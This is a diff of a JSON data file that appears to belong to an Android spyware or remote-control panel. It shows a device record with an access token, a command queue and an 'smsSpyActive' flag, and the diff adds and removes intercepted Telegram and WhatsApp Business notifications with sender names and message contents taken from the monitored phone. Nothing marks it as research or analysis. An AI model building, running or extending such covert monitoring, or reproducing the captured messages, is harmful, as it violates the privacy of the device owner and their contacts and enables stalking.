@@ -311,7 +311,7 @@
     "deviceName": "HP-SAYANG-4049",
     "ownerUsername": "GANANG",
     "token": "a70009f8a5d81c6b767372cdc0d6c979",
-    "lastSeen": 1775632444084,
+    "lastSeen": 1775632453108,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-08T06:28:11.035Z",
@@ -327,6 +327,54 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "Telegram",
+        "sender": "ALL BUYYER GOJO HARIAN: 𝗩𝗮𝗻𝘇𝘇𝗼_𝗢𝗳𝗳𝗶𝗰𝗶𝗮𝗹",
+        "content": "Send id tele lu",
+        "time": "08/04 14:14",
+        "pkg": "org.telegram.messenger.web",
+        "receivedAt": 1775632453992
+      },
+      {
+        "appName": "Telegram",
+        "sender": "マ || !`𝙈𝙖𝙣𝙯𝙧𝙤𝙬𝙧 𝐓𝟓",
+        "content": "enggaa",
+        "time": "08/04 14:14",
+        "pkg": "org.telegram.messenger.web",
+        "receivedAt": 1775632453883
+      },
+      {
+        "appName": "Telegram",
+        "sender": "Telegram",
+        "content": "10 new messages from 10 chats",
+        "time": "08/04 14:14",
+        "pkg": "org.telegram.messenger.web",
+        "receivedAt": 1775632453618
+      },
+      {
+        "appName": "Telegram",
+        "sender": "ALL BUYYER GOJO HARIAN: 𝗩𝗮𝗻𝘇𝘇𝗼_𝗢𝗳𝗳𝗶𝗰𝗶𝗮𝗹",
+        "content": "Send id tele lu",
+        "time": "08/04 14:14",
+        "pkg": "org.telegram.messenger.web",
+        "receivedAt": 1775632446892
+      },
+      {
+        "appName": "Telegram",
+        "sender": "マ || !`𝙈𝙖𝙣𝙯𝙧𝙤𝙬𝙧 𝐓𝟓",
+        "content": "enggaa",
+        "time": "08/04 14:14",
+        "pkg": "org.telegram.messenger.web",
+        "receivedAt": 1775632446799
+      },
+      {
+        "appName": "Telegram",
+        "sender": "Alifzx rezz",
+        "content": "Tar",
+        "time": "08/04 14:14",
+        "pkg": "org.telegram.messenger.web",
+        "receivedAt": 1775632446704
+      },
       {
         "appName": "Telegram",
         "sender": "Telegram",
@@ -4278,54 +4326,6 @@
         "time": "08/04 13:44",
         "pkg": "org.telegram.messenger.web",
         "receivedAt": 1775630687530
-      },
-      {
-        "appName": "Telegram",
-        "sender": "Telegram",
-        "content": "Sending video...",
-        "time": "08/04 13:44",
-        "pkg": "org.telegram.messenger.web",
-        "receivedAt": 1775630687336
-      },
-      {
-        "appName": "Telegram",
-        "sender": "𝗩𝗮𝗻𝘇𝘇𝗼_𝗢𝗳𝗳𝗶𝗰𝗶𝗮𝗹",
-        "content": "Gimana dh",
-        "time": "08/04 13:44",
-        "pkg": "org.telegram.messenger.web",
-        "receivedAt": 1775630646623
-      },
-      {
-        "appName": "Telegram",
-        "sender": "𝗩𝗮𝗻𝘇𝘇𝗼_𝗢𝗳𝗳𝗶𝗰𝗶𝗮𝗹",
-        "content": "Harus ada apk aku video kan",
-        "time": "08/04 13:38",
-        "pkg": "org.telegram.messenger.web",
-        "receivedAt": 1775630326683
-      },
-      {
-        "appName": "Telegram",
-        "sender": "𝗩𝗮𝗻𝘇𝘇𝗼_𝗢𝗳𝗳𝗶𝗰𝗶𝗮𝗹",
-        "content": "Gak punya sih itu apk nya",
-        "time": "08/04 13:38",
-        "pkg": "org.telegram.messenger.web",
-        "receivedAt": 1775630297137
-      },
-      {
-        "appName": "WA Business",
-        "sender": "𝙏𝙀𝘼𝙈 𝙉𝘼𝙓𝙍𝘼𝙏",
-        "content": "~ NeonsAtrm: ?",
-        "time": "08/04 13:37",
-        "pkg": "com.whatsapp.w4b",
-        "receivedAt": 1775630237807
-      },
-      {
-        "appName": "WA Business",
-        "sender": "𝙏𝙀𝘼𝙈 𝙉𝘼𝙓𝙍𝘼𝙏: Membalas Anda",
-        "content": "~ NeonsAtrm: ?",
-        "time": "08/04 13:37",
-        "pkg": "com.whatsapp.w4b",
-        "receivedAt": 1775630237710
       }
     ],
     "galleryPhotos": [],
